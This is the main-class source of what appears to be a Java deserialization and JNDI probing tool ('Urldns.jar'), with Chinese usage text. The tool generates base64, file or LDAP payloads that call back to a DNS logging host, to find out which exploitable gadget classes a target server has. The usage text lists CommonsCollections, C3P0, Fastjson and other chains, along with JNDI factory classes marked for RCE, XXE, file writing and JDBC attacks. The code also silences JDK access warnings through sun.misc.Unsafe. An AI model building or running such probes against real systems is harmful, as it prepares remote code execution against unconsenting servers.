package main;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class start {

	public static void main(String[] args) {
    	disableAccessWarnings();
    	
    	System.out.println("\r\n此工具仅能dnslog漏洞测试，不可用于非法用途，有问题请联系sonomon@126.com\r\n");
    	if (args.length == 3){
    		if (args[0].equals("base64")|args[0].equals("file")|args[0].equals("ldap")){
    			try {
					en.run(args[0], args[1], args[2]);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}else {
				error("错误！！！第一个参数只能输入base64或者file或者ldap");
			}
    	} else {
    		error("错误！！！参数数量不对");
		}
	}
	private static void error(String eString) {
		System.out.println(eString+"\r\n");
    	System.out.println("有三种模式，base64，file，ldap，file默认当前目录生成文件1.ser，ldap默认端口1389。\r\n"
    			+ "请输入: java -jar Urldns.jar base64 all dnslog.com\r\n"
    			+ "或者   : java -jar Urldns.jar file all dnslog.com\r\n"
    			+ "或者   : java -jar Urldns.jar ldap all dnslog.com\r\n"
    			+ "\r\n"
    			+ "目前支持的内置探测类如下，使用all将全部探测，可以将all替换为如下简写进行单独探测，也可以填写自定义的类进行探测。如果想同时探测多个类，用|分割。\r\n"
    			+ "CommonsCollections13567\r\n"
    			+ "CommonsCollections24\r\n"
    			+ "CommonsBeanutils2\r\n"
    			+ "C3P0\r\n"
    			+ "AspectJWeaver\r\n"
    			+ "bsh\r\n"
    			+ "Groovy\r\n"
    			+ "DefiningClassLoader\r\n"
    			+ "Becl\r\n"
    			+ "Jdk7u21\r\n"
    			+ "JRE8u20\r\n"
    			+ "ROME\r\n"
    			+ "Fastjson\r\n"
    			+ "Jackson\r\n"
    			+ "SpringAOP\r\n"
    			+ "winlinux\r\n"
    			+ "jdk17_22\r\n"
    			+ "jdk9_22\r\n"
    			+ "jdk6_8\r\n"
    			+ "jdk6_11\r\n"
    			+ "jdk9_10\r\n"
    			
    			+ "使用ldap模式的all将额外探测如下\r\n"
    			+ "//BeanFactory,配合无参构造和单String方法RCE\r\n"
    			+ "org.apache.naming.factory.BeanFactory\r\n"
    			+ "org.apache.catalina.filters.CsrfPreventionFilter$NonceCache\r\n"
    			+ "javax.el.ELProcessor\r\n"
    			+ "org.yaml.snakeyaml.Yaml\r\n"
    			+ "com.thoughtworks.xstream.XStream\r\n"
    			+ "org.mvel2.sh.ShellSession\r\n"
    			+ "//高版本tomcat无forceString\r\n"
    			+ "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory\r\n"
    			+ "org.apache.commons.configuration.SystemConfiguration\r\n"
    			+ "org.apache.commons.configuration2.SystemConfiguration\r\n"
    			+ "org.apache.groovy.util.SystemUtil\r\n"
    			+ "org.apache.batik.swing.JSVGCanvas\r\n"
    			+ "//XXE和写文件\r\n"
    			+ "org.apache.catalina.users.MemoryUserDatabaseFactory\r\n"
    			+ "org.apache.catalina.UserDatabase\r\n"
    			+ "//jdbc\r\n"
    			+ "org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory\r\n"
    			+ "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory\r\n"
    			+ "org.apache.commons.dbcp.BasicDataSourceFactory\r\n"
    			+ "org.apache.commons.dbcp2.BasicDataSourceFactory\r\n"
    			+ "org.apache.tomcat.jdbc.pool.DataSourceFactory\r\n"
    			+ "com.alibaba.druid.pool.DruidDataSourceFactory\r\n"
    			+ "com.zaxxer.hikari.HikariJNDIFactory\r\n"
    			+ "org.h2.Driver\r\n"
    			+ "org.postgresql.Driver\r\n"
    			+ "org.springframework.context.support.ClassPathXmlApplicationContext\r\n"
    			+ "com.mysql.jdbc.Driver\r\n"
    			+ "com.mysql.cj.jdbc.Driver\r\n"
    			+ "com.mysql.fabric.jdbc.FabricMySQLDriver\r\n"
    			+ "oracle.jdbc.driver.OracleDriver\r\n"
    			+ "com.ibm.db2.jcc.DB2Driver\r\n"
    			+ "COM.ibm.db2.jcc.DB2Driver\r\n"
    			+ "//WebSphere加载jar RCE\r\n"
    			+ "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory\r\n"
    			+ "com.ibm.ws.webservices.engine.client.ServiceFactory\r\n"
    			+ "//反序列化转getter(getConnection)转jdbc(h2)转所需要的DataSource中转类\r\n"
    			+ "oracle.ucp.jdbc.PoolDataSourceImpl\r\n"
    			+ "org.hibernate.service.jdbc.connections.internal.DriverManagerConnectionProviderImpl\r\n"
    			+ "\r\n"
    			+ "示例: java -jar Urldns.jar base64 \"CommonsBeanutils2|C3P0|ognl.OgnlContext\" dnslog.com\r\n"
    			+ "ldap模式支持ldap://2.2.2.2:1389/jndi，将不再反序列化而是远程加载class，以探测是否出网");
	}
    @SuppressWarnings("unchecked")
    public static void disableAccessWarnings() {
        try {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field field = unsafeClass.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            Object unsafe = field.get(null);
 
            Method putObjectVolatile =
                unsafeClass.getDeclaredMethod("putObjectVolatile", Object.class, long.class, Object.class);
            Method staticFieldOffset = unsafeClass.getDeclaredMethod("staticFieldOffset", Field.class);
 
            Class loggerClass = Class.forName("jdk.internal.module.IllegalAccessLogger");
            Field loggerField = loggerClass.getDeclaredField("logger");
            Long offset = (Long)staticFieldOffset.invoke(unsafe, loggerField);
            putObjectVolatile.invoke(unsafe, loggerClass, offset, null);
        } catch (Exception ignored) {
        }
    }
}
